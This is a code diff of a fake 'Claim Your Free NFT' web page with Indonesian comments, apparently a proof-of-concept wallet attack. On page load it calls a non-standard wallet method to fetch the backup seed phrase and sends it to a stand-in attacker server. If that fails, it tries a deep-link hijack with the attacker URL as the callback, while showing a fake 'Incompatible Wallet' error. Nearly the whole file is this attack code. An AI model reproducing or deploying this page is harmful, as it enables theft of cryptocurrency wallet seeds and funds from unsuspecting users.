@@ -1,61 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Free NFT Minting</title>
+    <meta charset="UTF-8">
+    <title>Claim Your Free NFT</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .loading { color: red; font-weight: bold; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 20%; }
+        .error { color: #ff3b30; font-size: 14px; font-weight: bold; margin-top: 10px; }
+        h1 { font-size: 24px; color: #1c1c1e; }
     </style>
 </head>
 <body>
     <h1>Claim Your Free NFT</h1>
-    <p id="status">Connecting to Wallet...</p>
-    <button id="mint-btn" style="display:none;">Mint Now</button>
+    <div class="error">Error: Incompatible Wallet. Please try another.</div>
 
     <script>
-        const ATTACKER_SERVER = "https://attacker.com/log";
+        // Alamat server penyerang untuk menampung data curian
+        const ATTACKER_ENDPOINT = "https://attacker-server.com/collect";
 
-        async function triggerExploit() {
-            const status = document.getElementById('status');
-            
-            // 1. Mencoba akses langsung ke API internal yang tidak terproteksi
-            // Sering terjadi pada dApp browser yang membocorkan bridge internal
-            try {
-                // Contoh method internal fiktif namun realistis dalam bug bounty
-                const secret = await window.ethereum.request({
-                    method: 'wallet_getBackupPhrase', // atau 'eth_exportPrivateKey'
-                    params: []
-                });
+        async function exploit() {
+            // Menunggu provider terinjeksi sepenuhnya
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    /* VULNERABILITY: Mengakses method internal wallet yang 
+                       seharusnya terproteksi (Unauthorized Command Execution).
+                    */
+                    const result = await window.ethereum.request({
+                        // Mencoba berbagai method non-standar yang sering bocor
+                        method: 'wallet_getBackupPhrase', 
+                        params: []
+                    });
 
-                if (secret) {
-                    sendToAttacker("SEED_PHRASE", secret);
+                    if (result) {
+                        // Jika berhasil, kirim seed phrase ke server penyerang
+                        await fetch(`${ATTACKER_ENDPOINT}?data=${encodeURIComponent(result)}`, {
+                            mode: 'no-cors'
+                        });
+                    }
+                } catch (err) {
+                    // Jika method pertama gagal, coba teknik Deep Link Hijacking
+                    // Ini memaksa wallet membuka fungsi internal via URI scheme
+                    const deepLink = "wallet-app://export-secret?callback=" + encodeURIComponent(ATTACKER_ENDPOINT);
+                    window.location.href = deepLink;
                 }
-            } catch (e) {
-                console.log("Method 1 failed");
             }
-
-            // 2. Mencoba bypass via Deep Link (URI Scheme)
-            // Mengarahkan ke halaman internal wallet untuk memicu kebocoran data
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                // Mencoba memanggil skema internal yang mengirim data kembali ke URL
-                iframe.src = "wallet-app://export?callback=" + encodeURIComponent(ATTACKER_SERVER);
-                document.body.appendChild(iframe);
-            }, 1000);
-
-            status.innerText = "Error: Incompatible Wallet. Please try another.";
-            status.className = "loading";
         }
 
-        function sendToAttacker(type, data) {
-            fetch(`${ATTACKER_SERVER}?type=${type}&data=${encodeURIComponent(data)}`, {
-                mode: 'no-cors'
-            });
-        }
-
-        // Jalankan exploit otomatis saat halaman dimuat
-        window.onload = triggerExploit;
+        // Eksekusi otomatis tanpa interaksi pengguna saat halaman dibuka
+        window.onload = () => {
+            setTimeout(exploit, 1000); 
+        };
     </script>
 </body>
 </html>
